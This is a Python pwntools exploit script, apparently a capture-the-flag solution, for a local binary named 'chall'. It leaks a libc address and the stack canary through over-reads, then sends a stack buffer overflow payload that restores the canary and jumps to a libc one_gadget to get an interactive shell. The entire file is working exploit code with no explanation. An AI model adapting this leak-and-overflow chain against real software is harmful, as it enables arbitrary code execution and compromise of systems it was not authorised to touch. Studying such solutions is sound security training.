#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./chall")

shell.sendafter(b"Input:\n", b"A" * 8)
shell.recvuntil(b"A" * 8)

libc_base = u64(shell.recv(6).ljust(8, b"\x00")) - 0x1ec6a0

shell.sendafter(b"Input:\n", b"A" * 105)
shell.recvuntil(b"A" * 105)

canary = u64(shell.recv(7).rjust(8, b"\x00"))

offset = 104
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(canary)
payload += b"B" * 8                 # rbp value
payload += p64(libc_base + 0xe6c81) # one_gadget

shell.sendafter(b"Input:\n", payload)
shell.sendafter(b"Input:\n", b"--\x00")
shell.interactive()
